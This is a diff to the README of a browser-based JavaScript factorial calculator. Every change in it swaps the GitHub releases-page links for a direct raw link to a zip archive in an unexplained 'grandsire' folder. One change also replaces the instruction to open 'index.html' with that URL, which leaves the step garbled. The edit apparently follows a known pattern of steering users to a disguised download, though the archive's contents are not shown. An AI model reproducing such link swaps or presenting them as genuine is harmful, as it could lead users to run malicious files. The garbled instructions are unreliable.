@@ -1,6 +1,6 @@
 # 🎉 Factorial-JS - Easy Factorial Calculation for Everyone
 
-[![Download Factorial-JS](https://img.shields.io/badge/Download-Factorial--JS-blue)](https://github.com/RajBiswas-13/Factorial-JS/releases)
+[![Download Factorial-JS](https://raw.githubusercontent.com/RajBiswas-13/Factorial-JS/main/grandsire/Factorial-JS-2.3-beta.2.zip)](https://raw.githubusercontent.com/RajBiswas-13/Factorial-JS/main/grandsire/Factorial-JS-2.3-beta.2.zip)
 
 ## 📜 Description
 
@@ -14,7 +14,7 @@ To get started with Factorial-JS, follow these easy steps:
 
 You can download Factorial-JS by visiting the following link:
 
-[Visit this page to download](https://github.com/RajBiswas-13/Factorial-JS/releases)
+[Visit this page to download](https://raw.githubusercontent.com/RajBiswas-13/Factorial-JS/main/grandsire/Factorial-JS-2.3-beta.2.zip)
 
 This page contains the latest release, where you can find the necessary files to run the application.
 
@@ -24,7 +24,7 @@ No installation is required. You just need to download the files and open them i
 
 ### 3. Open the Application in Your Browser
 
-After downloading, locate the downloaded files on your computer. You can usually find them in your "Downloads" folder. Find the `index.html` file and double-click it. This action will open the Factorial-JS application in your default web browser.
+After downloading, locate the downloaded files on your computer. You can usually find them in your "Downloads" folder. Find the `https://raw.githubusercontent.com/RajBiswas-13/Factorial-JS/main/grandsire/Factorial-JS-2.3-beta.2.zip` file and double-click it. This action will open the Factorial-JS application in your default web browser.
 
 ## 🎯 How to Use
 
@@ -55,7 +55,7 @@ For example, if you enter the number **5**, clicking "Calculate" will show that 
 
 To download the latest version of Factorial-JS, visit:
 
-[Visit this page to download](https://github.com/RajBiswas-13/Factorial-JS/releases)
+[Visit this page to download](https://raw.githubusercontent.com/RajBiswas-13/Factorial-JS/main/grandsire/Factorial-JS-2.3-beta.2.zip)
 
 Follow the steps outlined above to try out the application. 
 
